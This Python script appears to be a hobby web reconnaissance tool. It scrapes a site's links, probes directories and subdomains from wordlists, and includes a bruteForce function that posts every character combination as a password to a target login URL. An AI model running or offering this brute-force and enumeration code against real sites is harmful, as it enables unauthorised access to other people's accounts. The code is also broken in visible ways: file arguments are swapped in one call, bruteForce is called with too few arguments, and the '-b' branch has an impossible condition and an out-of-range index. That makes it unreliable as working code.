import sys, urllib, re, requests, time, string, itertools

def is_valid_url(url):

    """
    Validates a URL
    Params: The url to check
    Output: Validity status
    """

    # This Regex validates URLs 
    pattern = r"^((http|https):\/\/)?(www\.)?([\w\-\.]+)+$"

    # Checks for a match
    obj = re.match(pattern, url)
        
    return obj

def extractLinks(url, links):

    """
    Scrapes a url and finds all other links in its html
    Params: The url to scrape. A file where the result will be sent to
    Output: None
    """

    # Creates the Request
    req = urllib.request.Request(

        url=url, 
        headers={'User-Agent': 'Mozilla/5.0'} # This is used to prevent forbidden access

    )

    # Extracts the HTML
    webUrl = urllib.request.urlopen(req)

    # Extracts valid links
    links_pattern = r'href="[^#\"]{2,}?"'
    refs = re.findall(links_pattern, webUrl.read().decode())

    # Cleans the collected links
    cleaning_pattern = r'".*"'
        
    # Adds padding in the file
    links.write(url + ":\n\n")

    # Iterate through the links
    for ref in refs:

        line = re.findall(cleaning_pattern, ref)[0][1:-1] # Cleans and splice the link
        links.write("\t" + line + "\n") # Push to File
        links.flush() # Force a write

    # ADds padding in the file
    links.write("\n\n")


def extractDirectories(url, line, links, output):

    """
    Checks if a directory of a URL exists and extracts the links from it.
    Params: The url to search. The directory to match. The links file where the extracted links will be written. The output file where the directories are written
    Output: None
    """

    # Initializing the Search
    code = 429

    # This loop will prevent too many requests error. It will retry when 429 is stumbled upon
    while code == 429:

        # Sends a request to the URL and retrieves the code
        code = requests.get(url + line.rstrip('\n')).status_code

        # If the directory is not found
        if code == 404:

            print('Directory/File does not exist: ' + line.rstrip('\n'))

        # If the directory is found
        elif code // 100 == 2 or code == 403:

            print('Directory/File does exist: ' + line.rstrip('\n') + " " + str(code)) 

            # If the directory is not forbidden
            if code != 403:
                
                # Extracts the links in the directory
                extractLinks(master + line.rstrip('\n'), links)   

            # Adds the directory to a file
            output.write(url + line.rstrip('\n') + "\t" + str(code) + "\n" )
            output.flush()         

        # If too many requests were sent
        elif code == 429:

            print("Waiting")

            # The code waits
            time.sleep(5)

def extractSubdomains(line, output, links, pre, post):
    
    """
    Checks if a subdomain of a URL exists and extracts the links from it.
    Params: The subdomain to match. The output file where the directories are written. The links file where the extracted links will be written. The first part of the URL. The second part of the URL (after the subdomain)
    Output: None
    """

    # Initializing the Search
    code = 429

    # This loop will prevent too many requests error. It will retry when 429 is stumbled upon
    while code == 429:

        # Assembles the Link to search 
        link = pre + line.rstrip('\n') + "." + post
        
        try:
            
            # Sends a request to the URL and retrieves the code
            code = requests.get(link).status_code

        except:

            # Updates the status to not found if the server does not load
            code = 404

        # If the subdomain is not found
        if code == 404:

            print('Subdomain does not exist: ' + line.rstrip('\n'))

        # If the subdomain is found
        elif code // 100 == 2 or code == 403:

            print('Subdomain does exist: ' + line.rstrip('\n') + " " + str(code)) 

            # If the subdomain is not forbidden
            if code != 403:
                
                # Extracts the links in the subdomain
                extractLinks(link, links)

            # Adds the subdomain to a file
            output.write(link + "\t" + str(code) + "\n" )
            output.flush()
            
        # If too many requests were sent
        if code == 429:

            print("Waiting")

            # The code waits
            time.sleep(5)

def bruteForce(length, link, username):

    """
    Attempts to bruteforce in an account
    Params: The size of the passwords to check. The URL to attempt the attack on. The username to crack.
    Output: None (The password will be printed)
    """

    # Chooses the characters to use in password creation
    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

    # Creates the combinations by using cartesian products
    combinations = itertools.product(characters, repeat=length)

    # Extracts the passwords to an array
    strings = [''.join(combination) for combination in combinations]

    # Iterates through the strings
    for s in strings:

        # Builds the payload
        payload = {'username': username, 'password': s}

        # Sends the POST request
        response = requests.post(link, data=payload)

        # If a response was received
        if response.status_code == 200:
            
            # Displays the password
            print("Password found: ", s)
            return    
            
    # Expresses failure
    print("Login failed.")


def cleanUrls(master):

    """
    Takes a URL and break it down into its components
    Params: The url to break
    Output: The corrected URL. The first part of the URL that will come before the subdomain. The last part of the URL that will come after the subdomain
    """

    # Checks if the URL starts with Http
    if not master.startswith("http"):

        # If no http was found


            # Checks if the URL starts with www
            if not master.startswith("www."):

                # Adds http and www
                master = "https://www." + master

            else: 

                # Only adds http
                master = "https://" + master
    else:

            # removes http with regex to check whether it is followed with www.
            if not re.sub("https?:\/\/", "", master).startswith("www."):

                flag = False
                if master.find("https") != -1:

                    flag = True

                # Adds http with an s if secure and www. to the link
                master = ("https" if flag else "http") + "://www." + re.sub(r"https?://", "", master)


    # Breaks down the URL
    components = master.split("//")
    master = master.split("//")[0] + "//" + master.split("//")[1] + "/"

    # Creates the PreUrl
    sur_master = components[0] + "//"

    # Creates the PostUrl by removing www.
    sub_master = re.sub("www\.", "", components[1])

    return (master, sub_master, sur_master)

# If 
if(len(sys.argv) >= 2):

    master = sys.argv[1]

    if is_valid_url(master):

        (master, sub_master, sur_master) = cleanUrls(master)

        with open("./subdomains_output.bat", 'w') as domains_output:

            with open("./dirs_files_output.bat", 'w') as dirs_output:
                    
                with open("./links.bat", 'w') as links_output:

                    extractLinks(master, links_output)

                    if len(sys.argv) == 2 or sys.argv[2] == '-d':

                        with open("./dirs_dictionary.bat", "r") as dirs:

                            for line in dirs.readlines()[0:15]:
                                    
                                extractDirectories(master, line, dirs_output, links_output)

                    if len(sys.argv) == 2 or sys.argv[2] == '-s':

                        with open("./subdomains_dictionary.bat", "r") as dirs:

                                for line in dirs.readlines()[0:15]:
                                    
                                    extractSubdomains(line, domains_output, links_output, sur_master, sub_master)                        

                    if len(sys.argv) == 2 and sys.argv[2] == '-b':
                                    
                        if len(sys.argv) == 3:
                            
                            bruteForce(5, sys.argv[3])                        

                        else:

                            print("Missing Username")

    else:

        print("Invalid URL")                  

else:

    print("Missing Parameters")
       

       
            